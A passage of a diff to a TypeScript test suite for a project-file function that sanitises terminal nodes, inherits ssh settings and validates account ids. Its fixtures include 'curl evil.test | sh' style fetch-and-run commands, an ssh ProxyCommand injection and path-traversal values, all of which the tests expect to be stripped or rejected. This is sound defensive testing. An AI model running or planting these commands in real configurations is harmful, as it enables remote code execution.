@@ -103,25 +103,11 @@ describe('appendProjectNode', () => {
       ...sibling,
       shell: 'curl evil.test | sh',
       terminalProfileId: 'wsl:Foreign Distro',
-      pendingLaunch: {
-        after: ['term-dep-1'],
-        command: 'curl legacy-project-command.test | sh'
-      },
+      pendingLaunch: { after: ['term-dep-1'], command: 'curl legacy-project-command.test | sh' },
       futureNodeField: { deep: true },
-      ssh: {
-        host: 'h',
-        user: 'u',
-        port: 2222,
-        extraArgs: '-o ProxyCommand=evil',
-        execTrusted: true,
-        futureSshField: 'kept'
-      }
+      ssh: { host: 'h', user: 'u', port: 2222, extraArgs: '-o ProxyCommand=evil', execTrusted: true, futureSshField: 'kept' }
     }
-    const f = JSON.parse(
-      appendProjectNode(baseFile([hostileSibling]), { id: 'term-bbb-2' }, NOW)!
-    )
-
-    // The rewrite cleans both the existing node and the connection copied to the appended node.
+    const f = JSON.parse(appendProjectNode(baseFile([hostileSibling]), { id: 'term-bbb-2' }, NOW)!)
     for (const n of f.nodes) {
       expect(n.shell).toBeUndefined()
       expect(n.terminalProfileId).toBeUndefined()
@@ -131,12 +117,30 @@ describe('appendProjectNode', () => {
     }
     expect(f.nodes[0].futureNodeField).toEqual({ deep: true })
     expect(JSON.stringify(f)).not.toContain('legacy-project-command')
-    expect(f.nodes[0].ssh).toMatchObject({
-      host: 'h', user: 'u', port: 2222, futureSshField: 'kept'
-    })
-    expect(f.nodes[1].ssh).toMatchObject({
-      host: 'h', user: 'u', port: 2222, futureSshField: 'kept'
-    })
+    expect(f.nodes[0].ssh).toMatchObject({ host: 'h', user: 'u', port: 2222, futureSshField: 'kept' })
+    expect(f.nodes[1].ssh).toMatchObject({ host: 'h', user: 'u', port: 2222, futureSshField: 'kept' })
+  })
+
+  it('inherits ssh only from a remote tmux sibling with a complete ssh spec', () => {
+    const localSsh = { ...sibling, id: 'term-aaa-9', sshRemoteTmux: undefined }
+    const local = JSON.parse(appendProjectNode(baseFile([localSsh]), { id: 'term-c-1' }, NOW)!)
+    expect(local.nodes[1].ssh).toBeUndefined()
+    const incomplete = JSON.parse(appendProjectNode(baseFile([{ ...sibling, ssh: { host: 'h' } }]), { id: 'term-c-2' }, NOW)!)
+    expect(incomplete.nodes[1].ssh).toBeUndefined()
+    const remote = JSON.parse(appendProjectNode(baseFile([localSsh, sibling]), { id: 'term-c-3' }, NOW)!)
+    expect(remote.nodes[2].ssh).toEqual({ host: 'h', user: 'u' })
+    expect(remote.nodes[2].sshRemoteTmux).toBe(true)
+  })
+
+  it('carries and validates the account scope', () => {
+    const account = '9f1c2b3d-4e5f-6071-8293-a4b5c6d7e8f9'
+    const f = JSON.parse(appendProjectNode(baseFile([]), { id: 'term-c-1', accountId: account }, NOW)!)
+    expect(f.nodes[0].accountId).toBe(account)
+    for (const bad of ['../../etc', 'a/b', 'a b', '', 'a.b', 123 as never, {} as never]) {
+      expect(appendProjectNode(baseFile([]), { id: 'term-c-1', accountId: bad }, NOW)).toBeNull()
+    }
+  })
+
   it('inherits ssh ONLY from a real remote-tmux sibling — never from an `ssh <host>` terminal', () => {
     // A local project can hold a terminal that merely RUNS ssh (or a host attachment): it carries
     // `data.ssh` and runs on the local pty. The phone's session runs on THIS machine, so copying
